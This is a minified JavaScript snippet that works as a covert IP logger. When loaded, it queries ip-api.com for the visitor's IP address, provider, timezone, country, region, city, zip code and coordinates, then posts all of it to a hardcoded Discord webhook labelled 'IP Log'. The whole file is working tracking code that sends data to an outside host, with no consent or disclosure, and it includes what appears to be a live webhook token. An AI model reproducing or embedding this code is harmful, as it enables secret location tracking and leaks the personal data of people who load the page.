var webHookUrl="https://discord.com/api/webhooks/1085945338050916403/sYzgLvMQ9n7l5ZQ51_G82W1dtQw82LU1PmWl6kli-CHFeWWTN5rzzDKJQnb5kaUOI7tg";const request=async()=>{const response=await fetch('https://ip-api.com/json/');const data=await response.json();var ip=data.query;var provider=data.org+" ("+data.as+")";var timezone=data.timezone;var country=data.country;var countryCode=data.countryCode.toLowerCase()
var region=data.region+" ("+data.regionName+")";var city=data.city;var zip=data.zip;var lat=data.lat;var lon=data.lon;var postRequest=new XMLHttpRequest();postRequest.open("POST",webHookUrl);postRequest.setRequestHeader('Content-type','application/json');var params={username:"IP Log",avatar_url:"",content:"__**:globe_with_meridians: IP-Adress:**__ \n"
+"`"+ip+"`"+
"\n \n__**:telephone: Provider:**__ \n"
+provider+
"\n \n__**:map: Timezone:**__ \n"
+timezone+
"\n \n__**:flag_"+countryCode+": Country and Region:**__ \n"
+country+" - "+region+
"\n \n__**:cityscape: Zip Code & City:**__ \n"
+zip+" "+city+
"\n \n__**:round_pushpin: Location:**__ \n"
+"**Longitude:** "+lon+"\n"
+"**Latitude:** "+lat}
postRequest.send(JSON.stringify(params));}
request();